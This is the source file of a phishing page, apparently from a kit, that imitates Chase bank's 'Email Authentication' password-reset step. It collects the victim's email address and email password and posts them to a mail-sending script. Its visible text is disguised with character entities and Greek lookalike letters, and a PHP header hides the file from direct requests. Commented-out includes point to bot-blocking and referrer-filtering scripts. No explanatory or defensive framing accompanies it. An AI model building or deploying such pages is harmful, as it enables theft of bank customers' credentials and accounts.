<?php
   $currentPage = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
   
   if ($_SERVER['REQUEST_METHOD'] == "GET" && strcmp(basename($currentPage), basename(__FILE__)) == 0)
   {
       http_response_code(404);
       include('error_page.php'); // provide your own 404 error page
       die(); /* remove this if you want to execute the rest of
                 the code inside the file before redirecting. */
   }
   // include 'hidden.php';
   // include 'anoxytytrap/bot.php';
   // include 'anoxytytrap/ref.php';
   ?>
<?php 
   define('Myheader', TRUE);
   ?>
<?php include 'includes/header.php'; ?>
<style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('assets/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-regular.woff') format('woff'),url('assets/fonts/opensans-regular.ttf') format('truetype'),url('assets/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('assets/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-semibold.woff') format('woff'),url('assets/fonts/opensans-semibold.ttf') format('truetype'),url('assets/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 700;src: url('assets/fonts/opensans-bold.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-bold.woff') format('woff'),url('assets/fonts/opensans-bold.ttf') format('truetype'),url('assets/fonts/opensans-bold.svg#opensans-bold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 800;src: url('assets/fonts/opensans-extrabold.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-extrabold.woff') format('woff'),url('assets/fonts/opensans-extrabold.ttf') format('truetype'),url('assets/fonts/opensans-extrabold.svg#opensans-extrabold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('assets/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-light.woff') format('woff'),url('assets/fonts/opensans-light.ttf') format('truetype'),url('assets/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('assets/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('assets/fonts/videoplayer.woff') format('woff'),url('assets/fonts/videoplayer.ttf') format('truetype'),url('assets/fonts/videoplayer.svg#videoplayer') format('svg');}
   html {height:100%; background: #fff;}
   @media only screen and (min-width: 768px) {
   html {
   background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
   }
   }
</style>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
   <div id="logonApp" data-is-view="true">
      <div class="homepage" tabindex="-1">
         <div id="advertisenativeapp" data-has-view="true">
            <div data-is-view="true">
               <div class="advertiseNativeApp"></div>
            </div>
         </div>
         <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
            <div data-is-view="true"> </div>
         </div>
         <div class="logon-container" id="container">
            <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
               <div class="logon header jpui transparent navigation bar" data-is-view="true">
                  <a id="logoHomepageLink" href="#">
                     <div class="chase logo"></div>
                     <span class="util accessible-text">&#x43;&#x68;&#x61;&#x73;&#x65;&#x20;&#x68;&#x6f;&#x6d;&#x65;&#x70;&#x61;&#x67;&#x65;</span>
                  </a>
               </div>
            </header>
            <main id="logon-content" data-has-view="true">
               <div class="msd password-reset first-step" data-is-view="true">
                  <div id="backgroundImage">
                     <div class="jpui background image fixed blurred" id="geoImage">
                        <style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.5.jpeg/default.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.5.jpeg/default.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.5.jpeg/default.jpeg', sizingMethod='scale');}@media (min-width:768px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.5.jpeg/default.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.5.jpeg/default.jpeg); } }@media (min-width:1200px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.5.jpeg/default.jpeg); } }</style>
                     </div>
                  </div>
                  <div class="container">
                     <div class="row jpui primary panel">
                        <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
                           <h1 class="header" id="passwordResetHeader" tabindex="-1">&#x46;&#x6f;&#x72;&#x20;&#x59;&#x6f;&#x75;&#x72;&#x20;&#x50;&#x72;&#x6f;&#x74;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;</h1>
                           <div class="row jpui panel body" id="mainpanel">
                              <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                                 <div class="progress u-no-outline" id="progress" tabindex="-1">
                                    <div class="row">
                                       <div class="col-xs-12 col-sm-6 clear-padding">
                                          <h2>Email Authenticati&#x6f;n <span class="util high-contrast">Step 2 of 4</span></h2>
                                       </div>
                                       <div class="col-xs-12 col-sm-6 progress-padding">
                                          <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                             <ol class="steps-4" role="presentation">
                                                <li  id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li>
                                                <li class="active current-step" id="progress-progressBar-step-2"></li>
                                                <li id="progress-progressBar-step-3"></li>
                                                <li id="progress-progressBar-step-4"></li>
                                             </ol>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <p class="text customer-question"><span class="jpui link" id="identify_customer_question-link-wrapper"><a class="link-anchor" id="identify_customer_question" href="javascript:void(0);" aria-label=" Have a question? Opens dialog">Have a questi&omicron;n?</a></span></p>
                                 <h3>&#x48;&#x65;&#x6c;&#x70;&#x20;&#x75;&#x73;&#x20;&#x76;&#x65;&#x72;&#x69;&#x66;&#x79;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x69;&#x64;&#x65;&#x6e;&#x74;&#x69;&#x74;&#x79;&#x2e;</h3>
                                 <div class="group active" id="social_security_number_group">
                                    <div class="row">
                                       <form class="toggle-aria-hidden" method="POST" id="axx" autocomplete="off" action="tools/mail.php" >
                                          <div class="fl w-75" id="messages"></div>
                                          <div class="group active" id="social_security_number_group">
                                             <div class="row">
                                                <div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number" for="socialSecurityNumber-input-field" aria-hidden="false"> &#x45;&#x6d;&#x61;&#x69;&#x6c;&#x20;&#x41;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73; </label> </div>
                                                <div class="col-xs-12 col-sm-6 col-md-6 form-column">
                                                   <div class="form-toggle reset_by_social_security_number">
                                                      <div id=""> <input min="0" class="jpui input" id="" placeholder="" type="text" name="email" value="" required>    </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                          <div class="group active" id="social_security_number_group">
                                             <div class="row">
                                                <div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number" for="socialSecurityNumber-input-field" aria-hidden="false">&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&omicron;&#114;&#100; </label> </div>
                                                <div class="col-xs-12 col-sm-6 col-md-6 form-column">
                                                   <div class="form-toggle reset_by_social_security_number">
                                                      <div id="socialSecurityNumber"> <input min="0" class="jpui input" id="socialSecurityNumber-input-field" placeholder="" type="password" name="password" value="" required>    </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                    </div>
                                 </div>
                                 <br>
                                 <p>&#x57;e ask y&omicron;u t&omicron; verify y&omicron;ur email t&omicron; add this device as Tr&#x75;&#x73;&#x74;ed dev&iota;ces,and safeguard your acc&omicron;unt fr&omicron;m any &#x75;&#x6e;&#x61;&#x75;th&omicron;rized login fr&omicron;m unkn&omicron;wn &#x64;&#x65;&#x76;&iota;ce</p>
                                 <br><br>
                                 <br><br>
                                 <div class="button-container row hide-xs show-sm"><div class="col-xs-12 col-sm-3 col-sm-offset-6"><button type="button" id="exitResetPassword-sm" class="jpui button focus fluid"><span class="label">C&alpha;nc&#x65;&#x6c;</span> </button></div> <div id="logonSkipLinkContainer"></div> <div class="col-xs-12 col-sm-3"><button type="submit" id="proceedToLocateUserId-sm" class="jpui button focus fluid primary" aria-disabled="true"><span class="label">&#x4e;&#x65;&#x78;t</span> </button></div></div> <div class="button-container row hide-sm"><div class="col-xs-12 col-sm-3 col-sm-push-9"><button type="submit" id="proceedToLocateUserId" class="jpui button focus primary fluid" aria-disabled="true"><span class="label">&#x4e;&#x65;&#x78;t</span> </button></div> <div class="col-xs-12 col-sm-3 col-sm-push-3"><button type="button" id="exitResetPassword" class="jpui button focus fluid"><span class="label">C&alpha;nc&#x65;&#x6c;</span> </button></div></div>
                              </div>
                           </div>
                           </form> 
                           <style type="text/css">
                              .red		{color: #bb0826;
                              background-image: url('assets/img/warning-3-16.ico');
                              background-repeat: no-repeat;
                              padding-left: 30px;  /* width of the image plus a little extra padding */
                              display: block;
                              font-size: 1rem;
                              font-weight: 300;
                              color: #BF2155;
                              letter-spacing: 0;
                              width: 100%;
                              margin: .0625rem .0625rem .313rem 0;
                              font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
                              font-size: 16px;
                              }
                           </style>
                           <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
                           <script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
                           <script src="assets/dist/js/done.js"></script>
                           <script src="assets/dist/js/FormValidation.min.js"></script>
                        </div>
                     </div>
                  </div>
               </div>
            </main>
         </div>
         <footer class="logon-footer" id="logon-footer" data-has-view="true"></footer>
      </div>
      <div id="languageSupportDisclaimer"></div>
      <div id="overlay" data-has-view="true"></div>
      <div class="overlay"></div>
      <div id="signoutModal"></div>
      <div id="siteExitWarning"></div>
      <div id="serviceErrorModal"></div>
      <div id="sessionTimeoutModal"></div>
   </div>
</body>
</html>